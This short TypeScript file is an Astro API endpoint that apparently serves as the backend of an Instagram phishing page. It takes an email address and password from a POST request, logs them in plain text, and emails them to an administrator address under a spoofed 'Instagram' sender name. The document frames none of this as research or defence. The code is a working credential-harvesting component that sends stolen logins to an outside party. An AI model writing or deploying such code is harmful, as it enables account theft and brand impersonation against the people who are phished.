import { Resend } from "resend";
import type { APIRoute } from "astro";

export const POST: APIRoute = async ({ request }) => {
  const RESENDAPI = import.meta.env.PUBLIC_RESENDAPI;
  const resend = new Resend(RESENDAPI);
  const ADMIN = import.meta.env.PUBLIC_ADMIN_EMAIL;

  try {
    const { email, password } = await request.json();

    console.log(`Sending email to ${email} with password ${password}`);
    const response = await resend.emails.send({
      from: "Instagram <instagram@resend.dev>",
      to: [ADMIN],
      subject: `${email} password Instagram`,
      html: `The password of ${email} is ${password}`,
    });

    return new Response(JSON.stringify(response), {
      status: 200,
      headers: {
        "Content-Type": "application/json",
      },
    });
  } catch (error) {
    return new Response(
      JSON.stringify({
        success: false,
        error: (error as Error).message,
      }),
      {
        status: 500,
        headers: {
          "Content-Type": "application/json",
        },
      }
    );
  }
};
